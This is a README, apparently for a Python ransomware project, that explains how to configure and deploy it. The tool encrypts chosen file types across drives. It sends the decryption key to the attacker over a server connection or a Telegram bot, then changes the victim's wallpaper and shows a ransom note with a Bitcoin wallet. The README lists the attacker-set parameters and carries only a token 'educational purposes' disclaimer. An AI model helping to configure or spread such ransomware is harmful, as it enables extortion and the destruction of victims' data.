# ransomware-r4n50mW4r3
Hi✋
************************************************************************************************************************************************
⚠️Warning: Do not use it for any illegal purpose, just Only for educational purposes, if any illegal action happens, we will not be responsible.
************************************************************************************************************************************************

☢️☢️☢️This ransomware encrypt any kind of file formats and make connection with attacker with 2 way:
 1. Via server: you must define ip and port for programme to connect to the server
 2. Via telegram: you must define chat id and bot token for programme to connect to the telegram.
 * (default = telegram)

At the end , the programme change the background of victim machine and make a notice text with your wallet address and your alert.

**you must set below parameters in Variables part of enCryptor.py to run programme correctly:\
extensions = ('.txt', '.jpg',)\
Drives = ('C:\\', 'D:\\')\
encryption_level = (default=128 // 8)\
serverIp = ''\
talkingPort = (default=5678)\
sleepTimeForPopUpWebSite = (default=60 sec)\
PopUpWebSite = (default='https://bitcoin.org/en/') \
BackGroundUrl = (default= I declare a website in default)\
TelegramID = ''✔ with this telegram id victim can comunicate with attacker\
BTCWalletAddress = ''\
telegramChatID = ''\
BotToken = ''

**you must set below parameters in Variables part of deCryptor.py to run programme correctly:\
extensions = ('.txt', '.jpg',)\
Drives = ('C:\\', 'D:\\')\
key = b'' ✔ this key send by enCryptor.py to server or telegram with binary format\
encryption_level = (default=128 // 8) ✔ must be same with enCryptor.py encryption_level parameter\
BackGroundUrl = (default= I declare a website in default)☢️☢️☢️

✨note: The enCryptor.py has a safe mode that ask you for run the programme or not. 
